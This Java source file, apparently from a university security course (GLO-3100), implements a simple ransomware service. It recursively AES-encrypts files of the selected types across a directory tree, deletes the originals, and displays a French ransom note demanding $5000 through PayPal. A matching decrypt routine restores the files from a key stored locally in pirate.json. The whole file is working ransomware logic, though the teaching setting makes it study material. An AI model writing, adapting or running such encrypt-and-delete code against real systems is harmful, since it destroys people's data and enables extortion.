package ca.ulaval.glo3100.aes;

import ca.ulaval.glo3100.args.Args;
import ca.ulaval.glo3100.args.FileType;
import ca.ulaval.glo3100.console.Logger;
import ca.ulaval.glo3100.utils.*;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.File;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;

public class AESService {

    private static final String FILE_TYPES_FILENAME = "pirate.txt";
    private static final String ENCRYPTION_PARAMS_FILENAME = "pirate.json";

    public static void execute(Args args) {
        switch (args.operation) {
            case ENCRYPT:
                encrypt(args.directory, args.fileTypes);
                break;
            case DECRYPT:
                decrypt(args.directory);
                break;
        }
    }

    /**
     * @param directory Directory to encrypt files in
     * @param fileTypes File types to encrypt
     */
    private static void encrypt(File directory, List<FileType> fileTypes) {
        Logger.logDebug(String.format(
                "Encrypting with directory %s and file types %s",
                directory,
                fileTypes.stream().map(FileType::toString).collect(Collectors.joining(", "))));

        SecretKey key = EncryptionParamsUtils.generateKey();
        Logger.logDebug(String.format("Key : %s", Base64.getEncoder().encodeToString(key.getEncoded())));
        IvParameterSpec iv = EncryptionParamsUtils.generateIv();
        Logger.logDebug(String.format("IV : %s", Base64.getEncoder().encodeToString(iv.getIV())));

        // Encrypt files
        encryptFiles(directory, fileTypes, key, iv);;

        // Save filenames and contents to pirate.txt
        TextFileUtils.saveFileTypes(directory, FILE_TYPES_FILENAME, fileTypes);
        Logger.logDebug(String.format("Save encrypted files to %s", FILE_TYPES_FILENAME));

        // Save key and iv to pirate.json
        JsonFileUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv);
        Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));

        // Display ransom message
        Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
    }

    // TODO : Add javadocs
    private static void encryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
        // Get files matching file types to encrypt
        List<File> filesToEncrypt = FileUtils.getFiles(directory, fileTypes, false);

        // Encrypt each file
        for (File file : filesToEncrypt) {
            CipherUtils.encrypt(file, key, iv);
        }

        // Delete original files
        FileUtils.deleteFiles(filesToEncrypt);

        // Get subdirectory in directory
        List<File> subdirectories = FileUtils.getSubdirectories(directory);

        // Recursively encrypt each subdirectory
        for (File subdirectory : subdirectories) {
            encryptFiles(subdirectory, fileTypes, key, iv);
        }
    }

    /**
     * @param directory Directory to decrypt files from
     */
    private static void decrypt(File directory) {
        Logger.logDebug(String.format("Decrypting with directory %s", directory));

        // Get encrypted files from pirate.txt
        List<FileType> fileTypes = TextFileUtils.getFileTypes(directory, FILE_TYPES_FILENAME);
        Logger.logDebug(String.format("Read encrypted files from %s", FILE_TYPES_FILENAME));

        // Get encryption params (key and iv) from pirate.json
        EncryptionParams encryptionParams = JsonFileUtils.getEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME);
        Logger.logDebug(String.format("Read key and iv to %s", ENCRYPTION_PARAMS_FILENAME));

        // Convert encryption params to their original forms
        SecretKey key = EncryptionParamsUtils.toSecretKey(encryptionParams.key);
        IvParameterSpec iv = EncryptionParamsUtils.toIvParameterSpec(encryptionParams.iv);

        // Decrypt files
        decryptFiles(directory, fileTypes, key, iv);

        // Delete encryption params and file types files
        FileUtils.deleteFile(directory, ENCRYPTION_PARAMS_FILENAME);
        FileUtils.deleteFile(directory, FILE_TYPES_FILENAME);

        // Display decryption message
        Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
    }

    // TODO : Add javadocs
    private static void decryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
        // Get files matching file types to decrypt
        List<File> filesToDecrypt = FileUtils.getFiles(directory, fileTypes, true);

        // Decrypt each file
        for (File file : filesToDecrypt) {
            CipherUtils.decrypt(file, key, iv);
        }

        // Delete encrypted files
        FileUtils.deleteFiles(filesToDecrypt);

        // Get subdirectory in directory
        List<File> subdirectories = FileUtils.getSubdirectories(directory);

        // Recursively decrypt each subdirectory
        for (File subdirectory : subdirectories) {
            decryptFiles(subdirectory, fileTypes, key, iv);
        }
    }
}
